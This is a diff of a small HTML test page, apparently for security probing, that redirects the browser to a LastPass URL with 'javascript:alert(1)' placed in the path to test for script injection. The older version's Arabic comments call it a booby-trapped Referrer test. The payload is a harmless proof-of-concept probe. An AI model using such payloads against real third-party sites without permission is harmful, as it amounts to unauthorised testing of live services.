@@ -1,27 +1,59 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Referrer Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect Lab</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        button {
+            background-color: #d32d27;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background-color: #b0231e;
+        }
+    </style>
 </head>
 <body>
 
-    <h3>اختبار الـ Referrer المسار الملغم</h3>
-    
-    <!-- زر يقوم بالتوجيه إلى صفحة فرعية تحتوي على الكود في الرابط -->
-    <button onclick="triggerExploit()">اضغط للانتقال</button>
+<div class="container">
+    <h2>LastPass Redirect Test</h2>
+    <p>Click the button to test the path payload:</p>
+    <!-- The button that triggers the navigation -->
+    <button id="redirectBtn">Go to LastPass with Payload</button>
+</div>
 
-    <script>
-        function triggerExploit() {
-            // سنوجه المستخدم أولاً إلى مسار يحتوي على "الكود" كجزء من الرابط
-            // ثم من ذلك المسار يتم التوجيه إلى LastPass
-            let payloadPath = "/javascript:alert(1)";
-            
-            // ملاحظة: لكي يرسل المتصفح الـ Referrer كاملاً، يجب أن نكون على خادم (Server)
-            // المتصفحات الحديثة قد تقص المسار وتكتفي بالدومين فقط (Origin-only)
-            window.location.href = payloadPath;
-        }
-    </script>
+<script>
+    document.getElementById('redirectBtn').addEventListener('click', function() {
+        // Constructing the URL: Target Domain + Path + Your Javascript string
+        const targetUrl = "https://www.lastpass.com/fr/javascript:alert(1)";
+        
+        // Execute the redirection
+        window.location.href = targetUrl;
+    });
+</script>
 
 </body>
 </html>
